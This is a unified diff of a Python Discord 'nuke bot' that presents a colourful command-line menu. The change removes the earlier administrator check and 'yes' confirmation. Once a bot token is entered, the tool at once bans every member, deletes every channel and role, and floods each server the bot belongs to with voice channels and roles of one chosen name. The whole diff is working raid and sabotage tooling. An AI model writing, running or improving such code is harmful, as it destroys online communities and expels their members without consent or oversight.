@@ -1,120 +1,102 @@
 import discord
 from discord.ext import commands
+from colorama import init, Fore as cc
+from os import name as os_name, system
+from sys import exit
 import asyncio
-import logging
 
-# Initialize logging
-logging.basicConfig(level=logging.INFO)
+# Initialize colors
+init()
+r = cc.LIGHTRED_EX; m = cc.LIGHTMAGENTA_EX; g = cc.LIGHTGREEN_EX; b = cc.LIGHTBLUE_EX; y = cc.LIGHTYELLOW_EX; C = cc.LIGHTCYAN_EX; W = cc.RESET
 
-# Bot setup
-intents = discord.Intents.all()
-bot = commands.Bot(command_prefix='.', intents=intents)
+# Clear screen function
+clear = lambda: system('cls') if os_name == 'nt' else system('clear')
 
-# Nuke configuration
-delete_concurrency = 5  # Number of concurrent delete operations
+def _input(text):
+    print(text, end='')
+    return input()
 
-async def bulk_delete_channels(guild: discord.Guild):
-    sem = asyncio.Semaphore(delete_concurrency)
-    tasks = []
-    for channel in guild.channels:
-        async def _del(ch):
-            async with sem:
-                try:
-                    await ch.delete()
-                except Exception as e:
-                    logging.error(f"Channel delete failed: {e}")
-        tasks.append(asyncio.create_task(_del(channel)))
-    await asyncio.gather(*tasks)
+baner = f'''{r} _   _       _       {m} ____        _   
+{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
+{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
+{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
+{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
+{y}Made by: {g}https://github.com/Sigma-cc
+''' 
 
-async def bulk_delete_roles(guild: discord.Guild):
-    sem = asyncio.Semaphore(delete_concurrency)
-    tasks = []
-    for role in guild.roles:
-        async def _del(r):
-            async with sem:
-                try:
-                    await r.delete()
-                except Exception as e:
-                    logging.error(f"Role delete failed: {e}")
-        tasks.append(asyncio.create_task(_del(role)))
-    await asyncio.gather(*tasks)
-
-async def bulk_ban_members(guild: discord.Guild):
-    sem = asyncio.Semaphore(delete_concurrency)
-    tasks = []
-    for member in guild.members:
-        if member.bot or member == guild.me:
-            continue
-        async def _ban(m):
-            async with sem:
-                try:
-                    await guild.ban(m)
-                except Exception as e:
-                    logging.error(f"Ban failed: {e}")
-        tasks.append(asyncio.create_task(_ban(member)))
+async def delete_all_channels(guild):
+    tasks = [c.delete() for c in guild.channels]
     results = await asyncio.gather(*tasks, return_exceptions=True)
     return sum(1 for r in results if not isinstance(r, Exception))
 
-async def create_roles(guild: discord.Guild, name: str, count: int = 50):
-    sem = asyncio.Semaphore(delete_concurrency)
-    tasks = []
-    for _ in range(count):
-        async def _create():
-            async with sem:
-                try:
-                    await guild.create_role(name=name)
-                except Exception as e:
-                    logging.error(f"Role create failed: {e}")
-        tasks.append(asyncio.create_task(_create()))
-    await asyncio.gather(*tasks)
+async def delete_all_roles(guild):
+    tasks = [r.delete() for r in guild.roles if r.name != "@everyone"]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    return sum(1 for r in results if not isinstance(r, Exception))
 
-async def create_voice_channels(guild: discord.Guild, name: str, count: int = 20):
-    sem = asyncio.Semaphore(delete_concurrency)
-    tasks = []
-    for _ in range(count):
-        async def _create():
-            async with sem:
-                try:
-                    await guild.create_voice_channel(name=name)
-                except Exception as e:
-                    logging.error(f"Voice channel create failed: {e}")
-        tasks.append(asyncio.create_task(_create()))
-    await asyncio.gather(*tasks)
+async def ban_all_members(guild):
+    tasks = [guild.ban(member, reason=None) for member in guild.members if member != guild.me]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    return sum(1 for r in results if not isinstance(r, Exception))
 
-async def nuke_guild(guild: discord.Guild, name: str):
-    logging.info(f"Nuking guild: {guild.name} ({guild.id})")
-    banned_count = await bulk_ban_members(guild)
-    logging.info(f"Members banned: {banned_count}")
-    await bulk_delete_channels(guild)
-    logging.info("Channels deleted")
-    await bulk_delete_roles(guild)
-    logging.info("Roles deleted")
-    await create_voice_channels(guild, name)
-    logging.info("Voice channels created")
-    await create_roles(guild, name)
-    logging.info("Roles created")
+async def create_roles(guild, name, limit=100):
+    tasks = [guild.create_role(name=name) for _ in range(min(limit, 200 - len(guild.roles)))]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    return sum(1 for r in results if not isinstance(r, Exception))
 
-@bot.command(name='nuke', help='Nuke the entire server')
-@commands.has_permissions(administrator=True)
-async def nuke(ctx: commands.Context):
-    await ctx.message.delete()
-    confirm = await ctx.send('Are you sure you want to nuke this server? Reply with `yes` within 15 seconds.')
+async def create_voice_channels(guild, name, limit=100):
+    tasks = [guild.create_voice_channel(name=name) for _ in range(min(limit, 200 - len(guild.channels)))]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    return sum(1 for r in results if not isinstance(r, Exception))
 
-    def check(m):
-        return m.author == ctx.author and m.content.lower() == 'yes' and m.channel == ctx.channel
+async def nuke_guild(guild, name):
+    print(f"{r}>> Nuking: {m}{guild.name}{W}")
+    # Run destructive tasks concurrently
+    ban_task = ban_all_members(guild)
+    del_chan_task = delete_all_channels(guild)
+    del_role_task = delete_all_roles(guild)
 
-    try:
-        await bot.wait_for('message', timeout=15.0, check=check)
-    except asyncio.TimeoutError:
-        return await ctx.send('Nuke canceled.')
+    banned, channels_deleted, roles_deleted = await asyncio.gather(
+        ban_task, del_chan_task, del_role_task
+    )
+    print(f"{m}Banned: {b}{banned}{W}")
+    print(f"{m}Channels deleted: {b}{channels_deleted}{W}")
+    print(f"{m}Roles deleted: {b}{roles_deleted}{W}")
 
-    await nuke_guild(ctx.guild, name=ctx.guild.name)
-    await ctx.send('Server nuked.')
+    # Create new resources concurrently
+    create_voice = create_voice_channels(guild, name)
+    create_role = create_roles(guild, name)
+    voice_created, roles_created = await asyncio.gather(create_voice, create_role)
+    print(f"{m}Voice channels created: {b}{voice_created}{W}")
+    print(f"{m}Roles created: {b}{roles_created}{W}")
+    print(f"{r}{'-'*40}{W}\n")
 
-@bot.event
-async def on_ready():
-    logging.info(f"Logged in as {bot.user} | Connected to {len(bot.guilds)} guilds")
+# Main CLI
+while True:
+    clear()
+    choice = _input(f"{baner}\n{C}1){g} Run Nuke Bot  {C}2){g} Exit\n{y}Choice: {g}")
+    if choice == '1':
+        token = _input(f"{y}Bot token: {g}")
+        name = _input(f"{y}Name for new channels/roles: {g}")
 
-if __name__ == '__main__':
-    token = input('Enter bot token: ')
-    bot.run(token)
+        client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
+
+        @client.event
+        async def on_ready():
+            print(f"\n[+] Logged in as {client.user} in {len(client.guilds)} guilds")
+            tasks = []
+            for guild in client.guilds:
+                tasks.append(nuke_guild(guild, name))
+            # Execute nukes sequentially to respect rate limits
+            for t in tasks:
+                await t
+            await client.close()
+
+        try:
+            client.run(token)
+        except Exception as e:
+            print(f"{r}Error: {e}{W}")
+            input("Press Enter to return...")
+    elif choice == '2':
+        print(f"{r}Goodbye!{W}")
+        exit()
